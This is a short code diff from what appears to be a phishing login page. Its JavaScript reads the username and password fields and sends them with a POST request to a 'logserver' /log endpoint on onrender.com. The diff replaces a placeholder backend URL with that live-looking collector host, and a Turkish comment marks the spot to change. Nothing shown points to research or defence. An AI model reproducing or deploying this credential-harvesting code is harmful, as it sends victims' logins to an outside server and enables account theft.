@@ -304,7 +304,7 @@
     const username = document.getElementById("username").value;
     const password = document.getElementById("password").value;
 
-    fetch("https://your-render-backend-url.onrender.com/log", {   <!-- BUNU BURADA DEĞİŞTİR -->
+    fetch("https://logserver-rmu0.onrender.com/log", {   <!-- BUNU BURADA DEĞİŞTİR -->
       method: "POST",
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({ username, password }),
